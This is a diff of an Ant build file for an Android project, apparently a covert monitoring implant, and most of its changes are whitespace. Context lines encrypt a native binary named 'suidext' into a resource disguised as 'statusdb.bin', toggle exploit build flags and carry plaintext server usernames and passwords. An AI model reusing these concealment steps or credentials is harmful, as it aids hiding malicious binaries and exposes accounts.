@@ -28,7 +28,7 @@
 			</fileset>
 		</classpath>
 	</taskdef>
-	
+
 	<loadproperties srcFile="local.properties" />
 	<property file="ant.properties" />
 	<loadproperties srcFile="project.properties" />
@@ -72,7 +72,7 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
 		<delete file="res/raw/statusdb.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
-				
+
 	</target>
 
 	<target name="encrypt-manifest" depends="salt">
@@ -133,7 +133,7 @@
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
-					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />					
+					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
 				</case>
 				<case value="release">
 					<echo message="set release" />
@@ -150,16 +150,11 @@
 					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
 				</case>
 			</switch>
-						
+
 			<iff>
-				<and>
-					<equals arg1="@{osversion}" arg2="v2" />
-					<not>
-						<equals arg1="@{kind}" arg2="debug" />
-					</not>
-				</and>
+				<equals arg1="@{osversion}" arg2="v2" />
 				<then>
-				<!-- Alzare l'api level in caso di 3.x o 4.x -->
+					<!-- Alzare l'api level in caso di 3.x o 4.x -->
 					<echo message="Copy BackGround" />
 					<copy file="preprocess/AndroidManifest.BACKGROUND.xml" tofile="AndroidManifest.xml" overwrite="true">
 						<filterset>
@@ -276,8 +271,8 @@
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\android_${version}.zip" />
 		<copy file=".\server\android_${version}.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" />
 	</target>
-  
-  <target name="updatezenotto">
+
+	<target name="updatezenotto">
 		<updaterelease server="zenotto" login="admin" password="adminp123" file=".\server\android_${version}.zip" />
 		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
@@ -289,17 +284,20 @@
 		<echo>ant set-release : make messages.bin and cfg.java, for release</echo>
 		<echo>ant update : uploads the core to castore</echo>
 	</target>
-	
+
 	<target name="set-debug-v2" depends="init">
-	    <set-cfg kind="debug" osversion="v2"></set-cfg>
+		<set-cfg kind="debug" osversion="v2">
+		</set-cfg>
 	</target>
-	
+
 	<target name="set-release-v2" depends="init">
-	    <set-cfg kind="release" osversion="v2"></set-cfg>
+		<set-cfg kind="release" osversion="v2">
+		</set-cfg>
 	</target>
-	
+
 	<target name="set-debug-default" depends="init">
-	    <set-cfg kind="debug" osversion="default"></set-cfg>
+		<set-cfg kind="debug" osversion="default">
+		</set-cfg>
 	</target>
 
 	<target name="build" depends="init">
